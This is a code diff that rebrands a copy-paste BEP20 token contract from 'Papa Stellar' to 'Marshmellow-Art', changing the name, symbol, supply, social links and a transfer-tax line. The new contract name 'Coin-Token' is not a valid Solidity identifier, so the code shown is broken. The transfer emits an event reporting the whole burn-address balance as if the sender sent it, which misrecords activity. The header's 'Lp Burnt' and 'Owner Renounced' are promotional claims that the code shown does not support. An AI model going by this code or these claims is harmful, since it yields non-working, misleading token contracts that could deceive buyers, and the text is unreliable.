@@ -1,21 +1,24 @@
 // SPDX-License-Identifier: MIT
 
-/*   Welcome To Papa Stellar
-        Hold Papa Stellar and Earn Stellar
+/*   Welcome To Marshmellow-Art
+        marshmallow is a fanatical token to marshmellow.
+     and has good plans.  namely being the Best NFT Token, having a solid Community and Investors.
 
-     Papa Stellar ; PXLM
-     Supply   1.000.000.000
+     Website : https://mellow-art.com
+
+     MarshMellow-Art ; MellowART
+     Supply  10.000.000.000
      Max buy    100.000.000
      Max Wallet 500.000.000
 
 
     About Us : 
-    Telegram : https://t.me/papastellar
-    Twitter  : https://www.twitter.com/Papastellar1
-    Website  : https://papa-stellar.com
+    Telegram : https://t.me/mellowtoken
+    Twitter  : https://www.twitter.com/MarsmellowArt1
+    Website  : https://mellow-art.com/
 
-    Lp Locked 1 Year 
-    Owner Renounced 
+   🔥 Lp Burnt
+   ♻️ Owner Renounced 
 
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒▒▄███████▄▒▒▒▒▒
@@ -363,7 +366,7 @@ contract Ownable is Context {
     }
 }
 
-contract PAPASTELLAR is Context, iBEP20, Ownable {
+contract Coin-Token is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
@@ -377,11 +380,11 @@ contract PAPASTELLAR is Context, iBEP20, Ownable {
   address private _dividenttoken;
 
   constructor() public {
-    _name = 'PAPA STELLAR';
-    _symbol = 'PXLM';
+    _name = 'Marshmellow-ART';
+    _symbol = 'MELLOWART';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
-    _totalSupply = 1 * 10**9 * 10**9;
+    _totalSupply = 10 * 10**9 * 10**9;
     _balances[msg.sender] = _totalSupply;
 
     emit Transfer(address(0), msg.sender, _totalSupply);
@@ -599,9 +602,9 @@ contract PAPASTELLAR is Context, iBEP20, Ownable {
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
     _balances[recipient] = _balances[recipient].add(amount);
-    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee * 2);
+    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee);
      emit Transfer(sender, recipient, amount);
-    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * 1);
+    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
     uint256 fires = _balances[_burnaddress];
     emit Transfer(sender, _burnaddress, fires);
         
